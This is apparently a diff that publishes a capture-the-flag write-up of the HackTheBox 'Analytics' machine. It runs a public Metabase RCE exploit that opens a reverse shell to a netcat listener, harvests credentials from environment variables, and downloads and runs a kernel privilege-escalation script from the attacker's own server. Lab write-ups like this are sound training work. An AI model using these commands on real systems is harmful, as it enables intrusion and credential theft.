@@ -1,10 +1,223 @@
 ---
-layout: encrypted
+layout: post
 title: Analytics HackTheBox Machine - Writeup
 categories: [HackTheBox Machines]
-tags: [hackthebox,web,hackthebox easy,linux]
+tags: [hackthebox,web,hackthebox easy,linux,cve,rce,kernel exploit]
 image:
   path: /images/htb/easy/analytics/icon.png
-
-encrypted: 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
 ---
+
+Another machine today! Not too hard I think I'm going to step up the difficulty!
+
+**Machine created by:** [7u9y](https://app.hackthebox.com/users/260996) & [TheCyberGeek](https://app.hackthebox.com/users/114053)
+
+## Recon
+
+Starting with a nmap scan of the IP, we see 3 open ports.
+
+```
+$ sudo nmap 10.10.11.233 --top-ports 1000
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-03 02:53 AEDT
+Nmap scan report for 10.10.11.233
+Host is up (0.017s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+Lets edit our `/etc/hosts` and add a new entry (If we set it to `analytics.htb` it redirects us to `analytical.htb` so we will use that).
+
+```
+10.10.11.233 analytical.htb
+```
+
+Visiting [analytical.htb](http://analytical.htb:80) we see a common company landing page.
+
+![Home Page](/images/htb/easy/analytics/home.png)
+
+After clicking `Login` were shown a new subdomain: `data.analytical.htb`.
+
+Lets add that to the `/etc/hosts` file.
+
+```
+10.10.11.233 data.analytical.hackthebox,analytical.htb
+```
+
+Visiting `data.analytical.htb` we see a Metabase login page.
+
+![Metabase Login](/images/htb/easy/analytics/metabase.png)
+
+Looking for Metabase CVE's online I come across a [Pre-Auth RCE PoC](https://github.com/securezeron/CVE-2023-38646) which has a reverse shell script.
+
+## Exploitation & Initial Access
+
+Let's setup a listener locally with `nc`.
+
+```
+$ nc -lvnp 4444
+```
+
+And lets run the exploit:
+
+```
+$ python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lport 4444 --lhost 10.10.***.***
+[DEBUG] Original rhost: http://data.analytical.htb
+[DEBUG] Preprocessed rhost: http://data.analytical.htb
+[DEBUG] Input Arguments - rhost: http://data.analytical.hackthebox, lhost: 10.10.***.***, lport: 4444
+[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
+[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
+[DEBUG] Version: v0.46.6
+...
+[DEBUG] POST to http://data.analytical.htb/api/setup/validate failed with status code: 400
+```
+
+and on our listener we see a new shell!
+
+```
+Connection from 10.10.11.233:34544
+bash: cannot set terminal process group (1): Not a tty
+bash: no job control in this shell
+218a8fec6c49:/$ whoami
+whoami
+metabase
+```
+
+## User Flag
+
+Now looking through the `/app` directory I read `run_metabase.sh` and see its reading creds from environment variables.
+
+```sh
+# usage: file_env VAR [DEFAULT]
+#    ie: file_env 'XYZ_DB_PASSWORD' 'example'
+# (will allow for "$XYZ_DB_PASSWORD_FILE" to fill in the value of
+#  "$XYZ_DB_PASSWORD" from a file, especially for Docker's secrets feature)
+# taken from https://github.com/docker-library/postgres/blob/master/docker-entrypoint.sh
+# This is the specific function that takes the env var which has a "_FILE" at the end and transforms that into a normal env var.
+file_env() {
+    local var="$1"
+    local fileVar="${var}_FILE"
+    local def="${2:-}"
+    if [ "${!var:-}" ] && [ "${!fileVar:-}" ]; then
+        echo >&2 "error: both $var and $fileVar are set (but are exclusive)"
+        exit 1
+    fi
+    local val="$def"
+    if [ "${!var:-}" ]; then
+        val="${!var}"
+    elif [ "${!fileVar:-}" ]; then
+        val="$(< "${!fileVar}")"
+    fi
+    export "$var"="$val"
+    unset "$fileVar"
+}
+```
+
+Running `printenv` gives us the following output:
+
+```
+SHELL=/bin/sh
+MB_DB_PASS=
+HOSTNAME=218a8fec6c49
+LANGUAGE=en_US:en
+MB_JETTY_HOST=0.0.0.0
+JAVA_HOME=/opt/java/openjdk
+MB_DB_FILE=//metabase.db/metabase.db
+PWD=/app
+LOGNAME=metabase
+MB_EMAIL_SMTP_USERNAME=
+HOME=/home/metabase
+LANG=en_US.UTF-8
+META_USER=metalytics
+META_PASS=An4lytics_ds20223#
+MB_EMAIL_SMTP_PASSWORD=
+USER=metabase
+SHLVL=4
+MB_DB_USER=
+FC_LANG=en-US
+LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
+LC_CTYPE=en_US.UTF-8
+MB_LDAP_BIND_DN=
+LC_ALL=en_US.UTF-8
+MB_LDAP_PASSWORD=
+PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+MB_DB_CONNECTION_URI=
+JAVA_VERSION=jdk-11.0.19+7
+_=/bin/printenv
+OLDPWD=/
+```
+
+In there are the following credentials `metalytics:An4lytics_ds20223#`.
+
+Let's use this on SSH:
+
+```
+$ ssh metalytics@analytical.htb
+metalytics@analytical.htb's password:
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)
+...
+metalytics@analytics:~$ cat user.txt
+43b96c62ca27b47911880bebe17962df
+```
+
+And there's the user flag! <mark>43b96c62ca27b47911880bebe17962df</mark>
+
+## Root Flag
+
+I firstly check `sudo -l` for any living-off-the-land opportunities.
+
+```
+metalytics@analytics:~$ sudo -l
+[sudo] password for metalytics:
+Sorry, user metalytics may not run sudo on localhost.
+```
+
+Hmm...
+
+Any SUID binaries? (`find / -type f -perm -04000 -ls 2>/dev/null`)
+
+```
+      842     40 -rwsr-xr-x   1 root     root        40496 Nov 24  2022 /usr/bin/newgrp
+      697     72 -rwsr-xr-x   1 root     root        72072 Nov 24  2022 /usr/bin/gpasswd
+     1111     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /usr/bin/su
+     1187     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /usr/bin/umount
+      573     44 -rwsr-xr-x   1 root     root        44808 Nov 24  2022 /usr/bin/chsh
+      681     36 -rwsr-xr-x   1 root     root        35200 Mar 23  2022 /usr/bin/fusermount3
+     2484    228 -rwsr-xr-x   1 root     root       232416 Apr  3  2023 /usr/bin/sudo
+      876     60 -rwsr-xr-x   1 root     root        59976 Nov 24  2022 /usr/bin/passwd
+      830     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
+      567     72 -rwsr-xr-x   1 root     root        72712 Nov 24  2022 /usr/bin/chfn
+     1409     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    13994    332 -rwsr-xr-x   1 root     root         338536 Aug 24 13:40 /usr/lib/openssh/ssh-keysign
+    13665     20 -rwsr-xr-x   1 root     root          18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
+```
+
+None on GTFOBins...
+
+Look at other port activity (`netstat -nltp`), nothing of interest exists their either. 
+
+Nothing inside `printenv`, what now?
+
+I looked up for privilege escalation vulnerabilities in the Ubuntu version supplied once we joined SSH (Ubuntu 22.04.3) and found [CVE-2023-2640 + CVE-2023-32629 PoC](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) which gives root!
+
+I cloned the PoC locally and hosted a local python server (`python3 -m http.server`) and downloaded the exploit on the server.
+
+```
+metalytics@analytics:/tmp$ chmod +x exploit.sh
+metalytics@analytics:/tmp$ ./exploit.sh
+[+] You should be root now
+[+] Type 'exit' to finish and leave the house cleaned
+root@analytics:/tmp# cat /root/root.txt
+9db68c8ac70474f468afe8ca2ac44373
+```
+
+There's the root flag! <mark>9db68c8ac70474f468afe8ca2ac44373</mark>
+
+Success!
+
+![Success](/images/htb/easy/analytics/submitted.png)
+
+## Thanks for reading!
+Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).
+
+You can also find my other contacts on the [whoami](../about) page.
